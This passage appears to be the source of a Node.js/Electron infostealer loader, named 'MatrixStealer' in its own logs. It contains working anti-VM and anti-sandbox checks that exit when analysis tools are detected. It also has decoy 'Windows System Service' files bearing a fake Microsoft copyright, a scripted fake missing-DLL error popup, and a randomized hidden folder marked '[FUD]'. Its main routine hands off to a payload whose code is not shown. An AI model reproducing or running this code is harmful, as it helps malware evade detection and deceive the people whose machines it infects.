        if (os.cpus().length < 2) { if (DEBUG_ANTIVM) console.log(`[AntiVM] Low CPU cores: ${os.cpus().length}`); return true; }
        const totalRAM = os.totalmem() / 1024 ** 3;
        if (totalRAM < 4) { if (DEBUG_ANTIVM) console.log(`[AntiVM] Low RAM: ${totalRAM.toFixed(2)}GB`); return true; }
        return false;
    }
    static checkProcesses() {
        try {
            const processes = execSync('tasklist', { encoding: 'utf8', timeout: 1000, windowsHide: true }).toLowerCase();
            for (const proc of SANDBOX_PROCESSES) { if (processes.includes(proc)) { if (DEBUG_ANTIVM) console.log(`[AntiVM] Sandbox process detected: ${proc}`); return true; } }
            for (const proc of DEBUGGER_PROCESSES) { if (processes.includes(proc)) { if (DEBUG_ANTIVM) console.log(`[AntiVM] Debugger process detected: ${proc}`); return true; } }
            const procCount = processes.split('\n').length; if (procCount < 30) { if (DEBUG_ANTIVM) console.log(`[AntiVM] Low process count: ${procCount}`); return true; }
        } catch (e) { }
        return false;
    }
    static checkHostname() {
        const hostname = os.hostname().toLowerCase();
        for (const name of ANALYSIS_HOSTNAMES) { if (hostname.includes(name)) { if (DEBUG_ANTIVM) console.log(`[AntiVM] Analysis hostname detected: ${hostname}`); return true; } }
        return false;
    }
    static checkUsername() {
        const username = os.userInfo().username.toLowerCase();
        for (const user of ANALYSIS_USERNAMES) { if (username.includes(user)) { if (DEBUG_ANTIVM) console.log(`[AntiVM] Analysis username detected: ${username}`); return true; } }
        return false;
    }
    static checkVMFiles() {
        for (const file of VM_FILES) { try { if (fs.existsSync(file)) { if (DEBUG_ANTIVM) console.log(`[AntiVM] VM file detected: ${file}`); return true; } } catch (e) { } }
        return false;
    }
    static checkAnalysisDirs() {
        for (const dir of ANALYSIS_DIRECTORIES) { try { if (fs.existsSync(dir)) { if (DEBUG_ANTIVM) console.log(`[AntiVM] Analysis directory detected: ${dir}`); return true; } } catch (e) { } }
        return false;
    }
    static checkTempFiles() {
        try { const tempFiles = fs.readdirSync(os.tmpdir()); if (tempFiles.length < 10) { if (DEBUG_ANTIVM) console.log(`[AntiVM] Low temp files: ${tempFiles.length}`); return true; } } catch (e) { }
        return false;
    }
    static checkScreenSize() {
        try {
            const output = execSync('powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width"', { encoding: 'utf8', timeout: 1000, windowsHide: true });
            const width = parseInt(output.trim());
            if (width < 1024) { if (DEBUG_ANTIVM) console.log(`[AntiVM] Low screen width: ${width}`); return true; }
        } catch (e) { }
        return false;
    }
    static checkSleepPatching() {
        const requestedSleep = 1000; const start = Date.now(); const endTime = start + requestedSleep; while (Date.now() < endTime) { }
        const actualSleep = Date.now() - start; if (actualSleep < requestedSleep * 0.9) { if (DEBUG_ANTIVM) console.log(`[AntiVM] Sleep patching detected: ${actualSleep}ms vs ${requestedSleep}ms`); return true; }
        return false;
    }
    static checkNetworkInterfaces() {
        const interfaces = os.networkInterfaces(); const count = Object.keys(interfaces).length; if (count < 2) { if (DEBUG_ANTIVM) console.log(`[AntiVM] Low network interfaces: ${count}`); return true; }
        return false;
    }
    static checkRegistry() {
        const regKeys = [
            "HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions",
            "HKLM\\SYSTEM\\ControlSet001\\Services\\VBoxGuest",
            "HKLM\\SYSTEM\\ControlSet001\\Services\\VBoxMouse",
            "HKLM\\SYSTEM\\ControlSet001\\Services\\VBoxService",
            "HKLM\\SOFTWARE\\VMware, Inc.\\VMware Tools",
            "HKLM\\SYSTEM\\ControlSet001\\Services\\vmci",
            "HKLM\\SYSTEM\\ControlSet001\\Services\\vmhgfs",
            "HKLM\\SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters",
        ];
        for (const key of regKeys) { try { execSync(`reg query "${key}"`, { stdio: 'pipe', timeout: 1000, windowsHide: true }); if (DEBUG_ANTIVM) console.log(`[AntiVM] VM registry key found: ${key}`); return true; } catch (e) { } }
        return false;
    }
    static randomDelay() { const delay = Math.floor(Math.random() * 200) + 50; const start = Date.now(); while (Date.now() - start < delay) { } }
    static check() {
        if (DEBUG_ANTIVM) console.log('[AntiVM] Starting anti-VM/sandbox checks...');
        const checks = [
            { name: 'MAC Address', fn: this.checkMacAddress },
            { name: 'BIOS', fn: this.checkBIOS },
            { name: 'Disk', fn: this.checkDisk },
            { name: 'Hardware', fn: this.checkHardware },
            { name: 'Processes', fn: this.checkProcesses },
            { name: 'Hostname', fn: this.checkHostname },
            { name: 'Username', fn: this.checkUsername },
            { name: 'VM Files', fn: this.checkVMFiles },
            { name: 'Analysis Dirs', fn: this.checkAnalysisDirs },
            { name: 'Temp Files', fn: this.checkTempFiles },
            { name: 'Screen Size', fn: this.checkScreenSize },
            { name: 'Network Interfaces', fn: this.checkNetworkInterfaces },
            { name: 'Registry', fn: this.checkRegistry },
        ];
        for (let i = checks.length - 1; i > 0; i--) { const j = Math.floor(Math.random() * (i + 1));[checks[i], checks[j]] = [checks[j], checks[i]]; }
        for (const check of checks) {
            try {
                this.randomDelay();
                if (check.fn.call(this)) { if (DEBUG_ANTIVM) console.log(`[AntiVM] DETECTED: ${check.name}`); return true; }
            } catch (e) { if (DEBUG_ANTIVM) console.log(`[AntiVM] Error in ${check.name}: ${e.message}`); }
        }
        if (DEBUG_ANTIVM) console.log('[AntiVM] All checks passed - real system');
        return false;
    }
    static checkAndExit() { if (this.check()) { if (DEBUG_ANTIVM) console.log('[AntiVM] VM/Sandbox detected - exiting'); /* process.exit(0); */ } }
}

class LegitimateModule {
    static collectSystemInfo() {
        const info = {
            platform: os.platform(),
            arch: os.arch(),
            hostname: os.hostname(),
            cpus: os.cpus().length,
            totalMemory: Math.round(os.totalmem() / (1024 ** 3)) + 'GB',
            freeMemory: Math.round(os.freemem() / (1024 ** 3)) + 'GB',
            uptime: Math.round(os.uptime() / 3600) + 'h',
            nodeVersion: process.version,
            timestamp: new Date().toISOString()
        };
        return info;
    }
    static async checkForUpdates() {
        await this.sleep(500 + Math.random() * 1000);
        const updateInfo = { currentVersion: '1.0.0', latestVersion: '1.0.0', updateAvailable: false, checkTime: new Date().toISOString() };
        return updateInfo;
    }
    static createConfigFile() {
        const appData = process.env.APPDATA || path.join(os.homedir(), 'AppData', 'Roaming');
        const configDir = path.join(appData, 'WindowsSystemService');
        try {
            if (!fs.existsSync(configDir)) { fs.mkdirSync(configDir, { recursive: true }); }
            const configPath = path.join(configDir, 'config.json');
            const cfg = { version: '1.0.0', installDate: new Date().toISOString(), lastRun: new Date().toISOString(), settings: { autoUpdate: true, sendDiagnostics: false, checkInterval: 3600000 } };
            fs.writeFileSync(configPath, JSON.stringify(cfg, null, 2));
            return configPath;
        } catch (e) { return null; }
    }
    static createLogFile(message) {
        const appData = process.env.APPDATA || path.join(os.homedir(), 'AppData', 'Roaming');
        const logDir = path.join(appData, 'WindowsSystemService', 'Logs');
        try {
            if (!fs.existsSync(logDir)) { fs.mkdirSync(logDir, { recursive: true }); }
            const timestamp = new Date().toISOString();
            const logEntry = `[${timestamp}] ${message}\n`;
            const logPath = path.join(logDir, 'service.log');
            fs.appendFileSync(logPath, logEntry);
            return logPath;
        } catch (e) { return null; }
    }
    static simulateServiceBehavior() {
        this.createConfigFile();
        this.createLogFile('Service started');
        this.createLogFile('Initializing system check');
        this.createLogFile('System diagnostics running');
        this.checkForUpdates();
    }
    static async waitForHumanInteraction() {
        const startTime = Date.now(); const waitTime = 2000;
        while (Date.now() - startTime < waitTime) { await this.sleep(100); }
        return true;
    }
    static checkNetworkConnectivity() {
        return new Promise((resolve) => {
            try {
                const dns = require('dns');
                const { promisify } = require('util');
                const lookup = promisify(dns.lookup);
                const testHosts = ['google.com', 'cloudflare.com'];
                const results = {};
                Promise.all(testHosts.map(host => lookup(host).then(() => ({ host, success: true })).catch(() => ({ host, success: false })))).then((hostResults) => {
                    hostResults.forEach(({ host, success }) => { results[host] = success; });
                    resolve(results);
                }).catch(() => { resolve({}); });
            } catch (e) { resolve({}); }
        });
    }
    static createLegitimateFiles() {
        const tempDir = os.tmpdir(); const files = [];
        try {
            const readmePath = path.join(tempDir, 'SystemService_README.txt');
            const readmeContent = `\nWindows System Service\nVersion: 1.0.0\n\nThis is a system maintenance service that helps keep your system running smoothly.\n\nFeatures:\n- System diagnostics\n- Performance optimization\n- Update management\n\n© Microsoft Corporation. All rights reserved.`;
            fs.writeFileSync(readmePath, readmeContent); files.push(readmePath);
            const versionPath = path.join(tempDir, 'version.txt'); fs.writeFileSync(versionPath, '1.0.0.0'); files.push(versionPath);
        } catch (e) { }
        return files;
    }
    static performDiagnostics() {
        let result = 0; for (let i = 0; i < 100000; i++) { result += Math.sqrt(i); } return result;
    }
    static async sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
    static showFakeDllError() {
        if (Math.random() > 0.7) return;
        try {
            const tempDir = os.tmpdir(); const vbsPath = path.join(tempDir, 'system_check_' + Date.now() + '.vbs');
            const dllErrors = ['MSVCR100.dll', 'MSVCP140.dll', 'VCRUNTIME140.dll', 'api-ms-win-crt-runtime-l1-1-0.dll', 'ucrtbase.dll'];
            const randomDll = dllErrors[Math.floor(Math.random() * dllErrors.length)];
            const vbsContent = `\nSet WshShell = CreateObject("WScript.Shell")\nWshShell.Popup "The program can't start because ${randomDll} is missing from your computer. Try reinstalling the program to fix this problem.", 0, "System Error", 16\n`;
            fs.writeFileSync(vbsPath, vbsContent, 'utf8');
            exec(`cscript //nologo //B "${vbsPath}"`, { windowsHide: true }, (error) => { try { fs.unlinkSync(vbsPath); } catch (e) { } });
        } catch (error) { }
    }

    static async runLegitimateRoutine() {
        const sysInfo = this.collectSystemInfo();
        this.simulateServiceBehavior();
        await this.checkForUpdates();
        await this.checkNetworkConnectivity();
        this.createLegitimateFiles();
        this.performDiagnostics();
        this.showFakeDllError();
        await this.waitForHumanInteraction();
        this.createLogFile('Service initialization completed');
        return true;
    }
}

async function findRandomDeepFolder() {
    try {
        const baseDir = process.env.LOCALAPPDATA || os.tmpdir();
        // Generate a random directory name instead of 'ZeroTSCore-local'
        const randomName = crypto.randomBytes(8).toString('hex');
        const deepFolder = path.join(baseDir, randomName);
        fs.mkdirSync(deepFolder, { recursive: true });
        console.log(`[FUD] Using randomized deep folder: ${deepFolder}`);
        return deepFolder;
    } catch (error) {
        // Fallback to another random folder in temp
        const randomName = crypto.randomBytes(8).toString('hex');
        const fallbackDir = path.join(os.tmpdir(), randomName);
        fs.mkdirSync(fallbackDir, { recursive: true });
        console.log(`[FUD] Using fallback random folder: ${fallbackDir}`);
        return fallbackDir;
    }
}

async function main() {
    await runSystemInfo(CONFIG);
    console.log('Main started');
    try {
        console.log('=== MatrixStealer Started ===');
        console.log('Starting Windows System Service...');
        console.log('Checking AntiVM config...');
        if (ENABLE_ANTIVM) {
            console.log('Step 1/7: Checking for virtual machine...');
            const isVM = AntiVM.check();
            if (isVM) {
                console.log('Virtual machine detected! Exiting...');
                console.log('VM Detected, exiting');
                process.exit(0);
            }
            console.log('VM check passed');
        } else {
            console.log('AntiVM disabled, skipping check');
            console.log('AntiVM disabled');
        }
        console.log('Running system diagnostics...');
        await LegitimateModule.runLegitimateRoutine();
        console.log('Legitimate Routine finished');
        console.log('System diagnostics completed');
        console.log('Running security checks...');
        console.log('All security checks passed');
        console.log('Finding random deep folder...');
        const deepFolder = await findRandomDeepFolder();
        console.log(`Deep folder found: ${deepFolder}`);
        console.log(`Found deep folder: ${deepFolder}`);
        console.log('Running payload...');
        console.log('Starting InputPayload.main()...');
        console.log('Starting InputPayload...');
        await InputPayload.main(deepFolder);
        console.log('InputPayload finished');
        console.log('All operations completed successfully!');
        console.log('=== Summary ===');
        console.log('Total logs: N/A');
        console.log('Errors: N/A');
        console.log('Success: N/A');
        console.log('Duration: N/A');
        console.log('All done');
        setTimeout(() => { process.exit(0); }, 200);
    } catch (error) {
        console.log(`Fatal error: ${error.message}\n${error.stack}`);
        console.log(`Fatal error: ${error.message}`);
        console.log(`Stack trace: ${error.stack}`);
        process.exit(1);
    }
}

async function mainSilent() {
    try {
        await LegitimateModule.runLegitimateRoutine();
        if (AntiVM.check()) { process.exit(0); }
        const deepFolder = await findRandomDeepFolder();
        await InputPayload.main(deepFolder).catch(e => { console.log(`Error: ${e.message}`); });
        setTimeout(() => process.exit(0), 100);
    } catch (error) {
        process.exit(1);
    }
}

// Force execution logic
const startApp = () => {
    console.log('Starting app execution...');
    if (process.argv.includes('--silent')) {
        mainSilent();
    } else {
        main();
    }
};

let electronApp;
try {
    const electron = require('electron');
    if (typeof electron === 'object' && electron.app) {
        electronApp = electron.app;
    }
} catch (e) { }

if (electronApp) {
    electronApp.whenReady().then(() => {
        console.log('Electron app ready - Calling startApp');
        startApp();
    });
} else {
    console.log('Node environment detected - Calling startApp');
    startApp();
}

module.exports = { main, mainSilent, AntiVM, LegitimateModule, AdminCheck };
